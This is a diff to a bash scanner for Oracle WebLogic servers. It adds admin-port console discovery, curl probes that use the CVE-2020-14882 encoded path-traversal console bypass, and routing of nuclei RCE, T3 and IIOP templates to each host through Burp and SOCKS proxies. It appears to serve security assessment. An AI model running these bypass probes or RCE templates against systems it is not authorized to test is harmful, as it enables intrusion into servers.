@@ -11,7 +11,9 @@ set -euo pipefail
 # Usage:
 #   chmod +x scan-weblogic.sh
 #   ./scan-weblogic.sh [--dry-run] [--rows 2-79] [--timeout 30] [--rate 5]
-#                      [--attempts 3]   # retry a batch that returns no results
+#                      [--attempts 3]       # retry a batch that returns no results
+#                      [--admin-port 9002]  # WebLogic admin-port console (SSL); on
+#                      [--no-admin-port]    # by default — disable with this flag
 #
 # Requires: nuclei, python3, openpyxl, nc (netcat)
 ###############################################################################
@@ -60,6 +62,15 @@ T3_SSL_PORTS=""
 # ~len(ports)*2*PROBE_TIMEOUT), so enable it on specific suspected hosts.
 PORT_SCAN=false
 SCAN_PORTS="7001,7002,8001,8002,9001,9002,7003,8080,8443"
+# WebLogic Administration Port: when the domain flag "Enable Administration Port"
+# is on, the admin console (and all admin traffic) moves to https://host:9002 ONLY
+# — SSL-only — and the console is refused/redirected on the normal web port. So a
+# web-port console probe misses those hosts entirely. On by default: when no
+# console is found on the web port, also probe https://host:ADMIN_PORT/console and
+# route the console templates there in Phase 2. Default port 9002 (configurable;
+# disable with --no-admin-port).
+SCAN_ADMIN_PORT=true
+ADMIN_PORT=9002
 # Python interpreter used for the Excel read/write phases; must have openpyxl.
 # Override if `python3` on PATH lacks it, e.g. PYTHON=/path/to/python3 ./scan...
 PYTHON="${PYTHON:-python3}"
@@ -79,6 +90,8 @@ while [[ $# -gt 0 ]]; do
     --attempts)  NUCLEI_ATTEMPTS="$2"; shift 2 ;;
     --port-scan) PORT_SCAN=true; shift ;;
     --scan-ports) SCAN_PORTS="$2"; shift 2 ;;
+    --admin-port) ADMIN_PORT="$2"; shift 2 ;;
+    --no-admin-port) SCAN_ADMIN_PORT=false; shift ;;
     --excel)     EXCEL="$2"; shift 2 ;;
     *)           echo "Unknown option: $1"; exit 1 ;;
   esac
@@ -214,6 +227,9 @@ scan_surface() {
 
   local result_file="$SURFACE_DIR/row${row}.txt"
   local surfaces=""
+  # Base URL the Phase 2 console templates target. Defaults to the web URL; set to
+  # https://host:ADMIN_PORT if the console is found on the admin port instead.
+  local console_base="$url"
   # Human-readable evidence for each detected surface, written to column E in
   # Phase 3 alongside the machine token (which stays clean for has_surface).
   local reason=""
@@ -300,6 +316,62 @@ scan_surface() {
         # keep trying the other encoding in case one variant is filtered
       fi
     done
+  fi
+
+  # ── Admin-port console (SSL, default 9002) ──
+  # When the domain "Enable Administration Port" flag is on, the console lives ONLY
+  # at https://host:ADMIN_PORT (SSL) and is refused/redirected on the web port, so
+  # the web-port probe above misses it. Probe the admin port when no web-port
+  # console was found; on a hit, route the Phase 2 console templates to this base
+  # (console_base) instead of the web URL. Admin port is always HTTPS.
+  if $SCAN_ADMIN_PORT && ! echo "$surfaces" | grep -q "HTTP"; then
+    local admin_base="https://$host:$ADMIN_PORT"
+    local a_markers='WebLogic|con_context|Change Center|console\.portal|consolejndi'
+    local aout ameta acode aredir abody
+    aout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
+      --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
+      -w '__META__%{http_code}\t%{redirect_url}' \
+      "$admin_base/console/login/LoginForm.jsp" 2>/dev/null || printf '__META__000\t')
+    ameta=${aout##*__META__}; abody=${aout%__META__*}
+    acode=${ameta%%$'\t'*}; aredir=${ameta#*$'\t'}
+    case "$acode" in
+      200)
+        if printf '%s' "$abody" | grep -qiE "$wls_fp"; then
+          surfaces="HTTP"; console_base="$admin_base"
+          addr "HTTP: admin-port console on :$ADMIN_PORT (200 + WebLogic fingerprint; admin port enabled)"
+        fi
+        ;;
+      301|302|303|307|308)
+        if printf '%s' "$aredir" | grep -qiE 'console|LoginForm|j_security_check'; then
+          surfaces="HTTP"; console_base="$admin_base"
+          addr "HTTP: admin-port :$ADMIN_PORT $acode redirect to console/login ($aredir)"
+        fi
+        ;;
+      401|403)
+        surfaces="HTTP-restricted"; console_base="$admin_base"
+        addr "HTTP-restricted: $acode on admin-port console :$ADMIN_PORT (deployed but access-blocked)"
+        ;;
+    esac
+    # 14882 traversal on the admin port if the direct probe was inconclusive
+    if ! echo "$surfaces" | grep -q "HTTP"; then
+      local au atout atcode atbody
+      for au in \
+        "$admin_base/console/css/%2e%2e%2fconsole.portal" \
+        "$admin_base/console/images/%252e%252e%252fconsole.portal"; do
+        atout=$(curl -sk "${curl_proxy[@]+"${curl_proxy[@]}"}" \
+          --connect-timeout "$PROBE_TIMEOUT" --max-time "$TIMEOUT" \
+          -w '__META__%{http_code}' "$au" 2>/dev/null || printf '__META__000')
+        atcode=${atout##*__META__}; atbody=${atout%__META__*}
+        if [[ "$atcode" == "200" ]] && printf '%s' "$atbody" | grep -qiE "$a_markers"; then
+          surfaces="HTTP-bypass"; console_base="$admin_base"
+          addr "HTTP-bypass: CVE-2020-14882 traversal on admin-port :$ADMIN_PORT returned 200 ($au)"
+          break
+        elif [[ "$atcode" == "401" || "$atcode" == "403" ]]; then
+          surfaces="HTTP-restricted"; console_base="$admin_base"
+          addr "HTTP-restricted: $atcode on 14882 traversal admin-port :$ADMIN_PORT"
+        fi
+      done
+    fi
   fi
 
   # ── HTTP app-surface: WebLogic HTTP RCE endpoints (wls-wsat, _async, ws_utc)
@@ -446,7 +518,11 @@ scan_surface() {
   printf '%s' "$reason" > "$SURFACE_DIR/row${row}.reason"
   # Pin the plaintext WebLogic port for Phase 2 templates (falls back to first).
   echo "${wlport:-${plain_ports[0]}}" > "$SURFACE_DIR/row${row}.wlport"
-  echo "  [row $row] $host (http:$port wl:${wlport:-none}) -> $surfaces"
+  # Base URL for Phase 2 console templates (web URL, or the admin port if found there).
+  echo "$console_base" > "$SURFACE_DIR/row${row}.consoleurl"
+  local admin_note=""
+  [[ "$console_base" != "$url" ]] && admin_note=" console@${console_base}"
+  echo "  [row $row] $host (http:$port wl:${wlport:-none}) -> $surfaces${admin_note}"
 }
 
 while IFS=$'\t' read -r row url <&3; do
@@ -487,7 +563,6 @@ run_nuclei_for_target() {
   wlport=$(cat "$SURFACE_DIR/row${row}.wlport" 2>/dev/null || echo 7001)
   host_only=$(echo "$url" | sed -E 's|^https?://||;s|[:/].*||')
 
-  local templates=()
   local result_file="$RESULTS_DIR/row${row}.json"
 
   if [[ "$surfaces" == "NONE" ]]; then
@@ -496,112 +571,97 @@ run_nuclei_for_target() {
     return
   fi
 
+  # Base URL for console templates: the admin port (https://host:ADMIN_PORT) when
+  # the console was found there in Phase 1, otherwise the web URL.
+  local console_base
+  console_base=$(cat "$SURFACE_DIR/row${row}.consoleurl" 2>/dev/null || echo "$url")
+
   # Exact comma-token match so "T3" does NOT also match the SSL token "T3-ssl"
   # (templates speak plaintext; SSL surfaces are report-only, handled in Phase 1).
   has_surface() { case ",$surfaces," in *",$1,"*) return 0 ;; *) return 1 ;; esac; }
 
+  # Three template groups, each delivered to its own target:
+  #   console_tpls -> console_base (web URL, or admin-port https://host:9002)
+  #   app_tpls     -> web URL (wls-wsat/_async/ws_utc)
+  #   raw_tpls     -> host:wlport (T3/IIOP)
+  local console_tpls=() app_tpls=() raw_tpls=() t
+
   # Console templates: a console surface (HTTP / HTTP-restricted / HTTP-bypass).
   # Exact tokens so "HTTP-app" does NOT pull in the console preauth set.
   if has_surface HTTP || has_surface HTTP-restricted || has_surface HTTP-bypass; then
-    for t in "${HTTP_TEMPLATES[@]}"; do
-      [[ -f "$t" ]] && templates+=("-t" "$t")
-    done
+    for t in "${HTTP_TEMPLATES[@]}"; do [[ -f "$t" ]] && console_tpls+=("-t" "$t"); done
   fi
 
-  # HTTP app-surface templates: WebLogic HTTP RCE endpoints reachable
-  # through the proxy (wls-wsat/_async/ws_utc) — the main avenue
-  # when the console is hidden/blocked.
+  # HTTP app-surface templates (wls-wsat/_async/ws_utc) — always on the web URL,
+  # even if the console was found on the admin port.
   if has_surface HTTP-app; then
-    for t in "${HTTP_APP_TEMPLATES[@]}"; do
-      [[ -f "$t" ]] && templates+=("-t" "$t")
-    done
+    for t in "${HTTP_APP_TEMPLATES[@]}"; do [[ -f "$t" ]] && app_tpls+=("-t" "$t"); done
   fi
 
   # T3 templates: only plaintext T3 open
   if has_surface T3; then
-    for t in "${T3_TEMPLATES[@]}"; do
-      [[ -f "$t" ]] && templates+=("-t" "$t")
-    done
+    for t in "${T3_TEMPLATES[@]}"; do [[ -f "$t" ]] && raw_tpls+=("-t" "$t"); done
   fi
 
   # IIOP templates: need plaintext T3 (version probe) + plaintext IIOP (delivery)
   if has_surface T3 && has_surface IIOP; then
-    for t in "${IIOP_TEMPLATES[@]}"; do
-      [[ -f "$t" ]] && templates+=("-t" "$t")
-    done
+    for t in "${IIOP_TEMPLATES[@]}"; do [[ -f "$t" ]] && raw_tpls+=("-t" "$t"); done
   fi
 
-  if [[ ${#templates[@]} -eq 0 ]]; then
+  local count=$(( (${#console_tpls[@]} + ${#app_tpls[@]} + ${#raw_tpls[@]}) / 2 ))
+  if [[ $count -eq 0 ]]; then
     echo "  [row $row] no matching templates for surfaces: $surfaces"
     : > "$result_file"
     return
   fi
 
-  local count=$(( ${#templates[@]} / 2 ))
-
   if $DRY_RUN; then
-    echo "  [row $row] would run $count templates against $url (surfaces: $surfaces)"
+    echo "  [row $row] would run $count templates (surfaces: $surfaces; console@$console_base)"
     : > "$result_file"
     return
   fi
 
-  echo "  [row $row] scanning $url ($count templates, surfaces: $surfaces)..."
+  echo "  [row $row] scanning ($count templates, surfaces: $surfaces, console@$console_base)..."
 
-  # Split templates: HTTP (through Burp proxy) vs T3/IIOP (through SOCKS via proxychains)
-  local http_tpls=() raw_tpls=()
-  local i=0
-  while [[ $i -lt ${#templates[@]} ]]; do
-    if [[ "${templates[$i]}" == "-t" ]]; then
-      local tpl="${templates[$((i+1))]}"
-      if echo "$tpl" | grep -qE "/http/|2021-2109"; then
-        http_tpls+=("-t" "$tpl")
-      else
-        raw_tpls+=("-t" "$tpl")
-      fi
-      i=$((i+2))
-    else
-      i=$((i+1))
-    fi
-  done
-
-  # Start fresh: both batches below retry-on-no-results and APPEND their captured
-  # findings, so the result file must be truncated once up front.
+  # Start fresh: each batch below retries-on-no-results and APPENDS its findings.
   : > "$result_file"
 
-  # HTTP templates through Burp proxy (retried while no results)
-  if [[ ${#http_tpls[@]} -gt 0 ]]; then
-    local nuclei_proxy=()
-    [[ -n "$PROXY" ]] && nuclei_proxy=(-proxy "$PROXY")
-    local http_out
-    http_out=$(run_nuclei_retry nuclei -u "$url" \
-      "${http_tpls[@]}" \
+  local nuclei_proxy=()
+  [[ -n "$PROXY" ]] && nuclei_proxy=(-proxy "$PROXY")
+
+  # Console templates -> console_base (web URL, or admin-port https://host:9002)
+  if [[ ${#console_tpls[@]} -gt 0 ]]; then
+    local c_out
+    c_out=$(run_nuclei_retry nuclei -u "$console_base" \
+      "${console_tpls[@]}" \
       "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
-      -timeout "$TIMEOUT" \
-      -rate-limit "$RATE_LIMIT" \
-      -no-color -jsonl -silent)
-    [[ -n "$http_out" ]] && printf '%s\n' "$http_out" >> "$result_file"
+      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
+    [[ -n "$c_out" ]] && printf '%s\n' "$c_out" >> "$result_file"
   fi
 
-  # T3/IIOP templates through SOCKS via proxychains4.
-  # Target the real WebLogic listen port (host:wlport), NOT the HTTP URL/:443.
+  # HTTP app-surface templates -> web URL (wls-wsat/_async/ws_utc)
+  if [[ ${#app_tpls[@]} -gt 0 ]]; then
+    local a_out
+    a_out=$(run_nuclei_retry nuclei -u "$url" \
+      "${app_tpls[@]}" \
+      "${nuclei_proxy[@]+"${nuclei_proxy[@]}"}" \
+      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
+    [[ -n "$a_out" ]] && printf '%s\n' "$a_out" >> "$result_file"
+  fi
+
+  # T3/IIOP templates -> host:wlport via proxychains4 (NOT the HTTP URL/:443).
   if [[ ${#raw_tpls[@]} -gt 0 ]]; then
     local nuclei_wrap=""
     if [[ -n "$SOCKS" && -f "${PROXYCHAINS_CONF:-/dev/null}" ]] && command -v proxychains4 &>/dev/null; then
       nuclei_wrap="proxychains4 -q -f $PROXYCHAINS_CONF"
     fi
-
-    # The templates default args.Port to 7001, but nuclei OVERRIDES that with the
-    # target's explicit port. So we just pass host:wlport and the original,
-    # unmodified (signed) templates connect to the right port — no sed-editing of
-    # the port (which would invalidate the `# digest:` signature and make nuclei
-    # silently skip the template) and no re-signing. Verified: a template with a
-    # hardcoded Port: "7001" run against `-u host:17001` resolves Port=17001.
+    # Templates default args.Port to 7001, but nuclei OVERRIDES it with the target's
+    # explicit port, so the unmodified (signed) templates hit host:wlport — no
+    # sed-editing (which breaks the `# digest:` signature) and no re-signing.
     local raw_out
     raw_out=$(run_nuclei_retry $nuclei_wrap nuclei -u "$host_only:$wlport" \
       "${raw_tpls[@]}" \
-      -timeout "$TIMEOUT" \
-      -rate-limit "$RATE_LIMIT" \
-      -no-color -jsonl -silent)
+      -timeout "$TIMEOUT" -rate-limit "$RATE_LIMIT" -no-color -jsonl -silent)
     [[ -n "$raw_out" ]] && printf '%s\n' "$raw_out" >> "$result_file"
   fi
 
